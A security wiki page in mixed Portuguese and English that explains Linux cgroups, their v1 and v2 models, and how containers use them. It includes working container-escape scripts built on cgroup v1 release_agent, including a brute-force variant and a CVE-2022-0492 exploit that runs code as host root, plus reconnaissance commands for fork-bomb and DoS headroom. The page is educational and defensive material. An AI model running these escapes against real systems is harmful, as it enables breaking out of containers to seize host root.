# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Visão geral

Linux **grupos de controle** são o mecanismo do kernel usado para agrupar processos para contabilização, limitação, priorização e aplicação de políticas. Se namespaces tratam principalmente de isolar a visão dos recursos, cgroups tratam principalmente de governar **quanto** desses recursos um conjunto de processos pode consumir e, em alguns casos, **com quais classes de recursos** eles podem interagir.

Containers dependem dos cgroups constantemente, mesmo quando o usuário nunca os vê diretamente, porque quase todo runtime moderno precisa de uma forma de dizer ao kernel "estes processos pertencem a esta workload, e estas são as regras de recurso que se aplicam a eles".

É por isso que container engines colocam um novo container em sua própria subárvore de cgroup. Uma vez que a árvore de processos está lá, o runtime pode limitar memória, restringir o número de PIDs, ponderar o uso de CPU, regular I/O e restringir o acesso a dispositivos. Em um ambiente de produção, isso é essencial tanto para a segurança multi-tenant quanto para a higiene operacional simples. Um container sem controles de recursos significativos pode esgotar memória, inundar o sistema com processos ou monopolizar CPU e I/O de maneiras que tornam o host ou workloads vizinhos instáveis.

Do ponto de vista de segurança, cgroups importam de duas maneiras distintas. Primeiro, limites de recursos incorretos ou ausentes permitem ataques simples de denial-of-service. Segundo, algumas funcionalidades de cgroup, especialmente em configurações antigas de **cgroup v1**, historicamente criaram primitives de breakout poderosas quando eram graváveis a partir de dentro de um container.

## v1 Vs v2

Existem dois modelos principais de cgroup em uso. **cgroup v1** expõe múltiplas hierarquias de controladores, e explorações mais antigas frequentemente giram em torno das semânticas estranhas e às vezes excessivamente poderosas disponíveis ali. **cgroup v2** introduz uma hierarquia mais unificada e um comportamento geralmente mais limpo. Distribuições modernas preferem cada vez mais cgroup v2, mas ambientes mistos ou legados ainda existem, o que significa que ambos os modelos continuam relevantes ao revisar sistemas reais.

A diferença importa porque algumas das histórias de breakout de container mais famosas, como abusos de **`release_agent`** em cgroup v1, estão muito especificamente ligadas ao comportamento antigo dos cgroups. Um leitor que vê um exploit de cgroup em um blog e então o aplica cegamente em um sistema moderno somente com cgroup v2 provavelmente vai entender mal o que é realmente possível no alvo.

## Inspeção

A maneira mais rápida de ver onde seu shell atual está:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
O arquivo /proc/self/cgroup mostra os caminhos de cgroup associados ao processo atual. Em um host moderno com cgroup v2, você frequentemente verá uma entrada unificada. Em hosts mais antigos ou híbridos, você pode ver vários caminhos de controladores v1. Depois de conhecer o caminho, você pode inspecionar os arquivos correspondentes em /sys/fs/cgroup para ver limites e uso atual.

Em um host com cgroup v2, os seguintes comandos são úteis:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Estes arquivos revelam quais controllers existem e quais são delegados aos cgroups filhos. Esse modelo de delegação é importante em ambientes rootless e gerenciados pelo systemd, onde o runtime pode controlar apenas o subconjunto de funcionalidades de cgroup que a hierarquia pai realmente delega.

## Lab

Uma maneira de observar os cgroups na prática é executar um container com limitação de memória:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Você também pode tentar um PID-limited container:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
These examples are useful because they help connect the runtime flag to the kernel file interface. The runtime is not enforcing the rule by magic; it is writing the relevant cgroup settings and then letting the kernel enforce them against the process tree.

## Uso do Runtime

Docker, Podman, containerd, and CRI-O all rely on cgroups as part of normal operation. The differences are usually not about whether they use cgroups, but about **which defaults they choose**, **how they interact with systemd**, **how rootless delegation works**, and **how much of the configuration is controlled at the engine level versus the orchestration level**.

In Kubernetes, resource requests and limits eventually become cgroup configuration on the node. The path from Pod YAML to kernel enforcement passes through the kubelet, the CRI runtime, and the OCI runtime, but cgroups are still the kernel mechanism that finally applies the rule. In Incus/LXC environments, cgroups are also heavily used, especially because system containers often expose a richer process tree and more VM-like operational expectations.

## Misconfigurations And Breakouts

The classic cgroup security story is the writable **cgroup v1 `release_agent`** mechanism. In that model, if an attacker could write to the right cgroup files, enable `notify_on_release`, and control the path stored in `release_agent`, the kernel could end up executing an attacker-chosen path in the initial namespaces on the host when the cgroup became empty. That is why older writeups place so much attention on cgroup controller writability, mount options, and namespace/capability conditions.

Even when `release_agent` is not available, cgroup mistakes still matter. Overly broad device access can make host devices reachable from the container. Missing memory and PID limits can turn a simple code execution into a host DoS. Weak cgroup delegation in rootless scenarios can also mislead defenders into assuming a restriction exists when the runtime was never actually able to apply it.

### `release_agent` Background

The `release_agent` technique only applies to **cgroup v1**. The basic idea is that when the last process in a cgroup exits and `notify_on_release=1` is set, the kernel executes the program whose path is stored in `release_agent`. That execution happens in the **initial namespaces on the host**, which is what turns a writable `release_agent` into a container escape primitive.

For the technique to work, the attacker generally needs:

- a writable **cgroup v1** hierarchy
- the ability to create or use a child cgroup
- the ability to set `notify_on_release`
- the ability to write a path into `release_agent`
- a path that resolves to an executable from the host point of view

### Classic PoC

The historical one-liner PoC is:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Esta PoC escreve um caminho do payload em `release_agent`, aciona a liberação do cgroup e então lê de volta o arquivo de saída gerado no host.

### Explicação passo a passo

A mesma ideia fica mais fácil de entender quando dividida em passos.

1. Crie e prepare um cgroup gravável:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifique o caminho no host que corresponde ao sistema de arquivos do container:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Solte um payload que ficará visível no host path:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Acionar a execução esvaziando o cgroup:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
O efeito é a execução no host do payload com host root privileges. Em um exploit real, o payload geralmente escreve um proof file, inicia um reverse shell ou modifica o estado do host.

### Variante de Caminho Relativo Usando `/proc/<pid>/root`

Em alguns ambientes, o caminho do host para o container filesystem não é óbvio ou está oculto pelo storage driver. Nesse caso, o caminho do payload pode ser expresso através de `/proc/<pid>/root/...`, onde `<pid>` é um host PID pertencente a um processo no container atual. Essa é a base da variante brute-force por caminho relativo:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
O truque relevante aqui não é o brute force em si, mas a forma do caminho: `/proc/<pid>/root/...` permite ao kernel resolver um arquivo dentro do filesystem do container a partir do host namespace, mesmo quando o caminho de armazenamento direto do host não é conhecido antecipadamente.

### CVE-2022-0492 Variante

Em 2022, CVE-2022-0492 mostrou que escrever em `release_agent` no cgroup v1 não verificava corretamente `CAP_SYS_ADMIN` no **initial** user namespace. Isso tornou a técnica muito mais alcançável em kernels vulneráveis, porque um processo no container que pudesse montar uma hierarquia de cgroup poderia escrever em `release_agent` sem já ter privilégios no host user namespace.

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Em um kernel vulnerável, o host executa `/proc/self/exe` com privilégios de root do host.

Para abuso prático, comece verificando se o ambiente ainda expõe writable cgroup-v1 paths ou dangerous device access:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Se `release_agent` estiver presente e gravável, você já está em legacy-breakout territory:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Se o próprio caminho do cgroup não resultar em um escape, o próximo uso prático costuma ser denial of service ou reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Esses comandos informam rapidamente se a carga de trabalho tem espaço para fork-bomb, se pode consumir memória agressivamente ou abusar de uma interface cgroup legada gravável.

## Verificações

Quando revisar um alvo, o propósito das verificações de cgroup é determinar qual modelo de cgroup está em uso, se o container vê caminhos de controller graváveis e se antigas breakout primitives como `release_agent` são sequer relevantes.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
O que é interessante aqui:

- If `mount | grep cgroup` shows **cgroup v1**, writeups de breakout mais antigos tornam-se mais relevantes.
- If `release_agent` exists and is reachable, that is immediately worth deeper investigation.
- If the visible cgroup hierarchy is writable and the container also has strong capabilities, the environment deserves much closer review.

If you discover **cgroup v1**, writable controller mounts, and a container that also has strong capabilities or weak seccomp/AppArmor protection, that combination deserves careful attention. cgroups are often treated as a boring resource-management topic, but historically they have been part of some of the most instructive container escape chains precisely because the boundary between "resource control" and "host influence" was not always as clean as people assumed.

## Runtime Defaults

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimentos manuais comuns |
| --- | --- | --- | --- |
| Docker Engine | Ativado por padrão | Containers are placed in cgroups automatically; resource limits are optional unless set with flags | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Ativado por padrão | `--cgroups=enabled` is the default; cgroup namespace defaults vary by cgroup version (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, acesso relaxado a dispositivos, `--privileged` |
| Kubernetes | Ativado pelo runtime por padrão | Pods and containers are placed in cgroups by the node runtime; fine-grained resource control depends on `resources.requests` / `resources.limits` | omitir resource requests/limits, privileged device access, misconfiguração do runtime no nível do host |
| containerd / CRI-O | Ativado por padrão | cgroups are part of normal lifecycle management | direct runtime configs that relax device controls or expose legacy writable cgroup v1 interfaces |

A distinção importante é que **a existência de cgroup** é geralmente padrão, enquanto **restrições úteis de recursos** costumam ser opcionais a menos que sejam configuradas explicitamente.
{{#include ../../../../banners/hacktricks-training.md}}
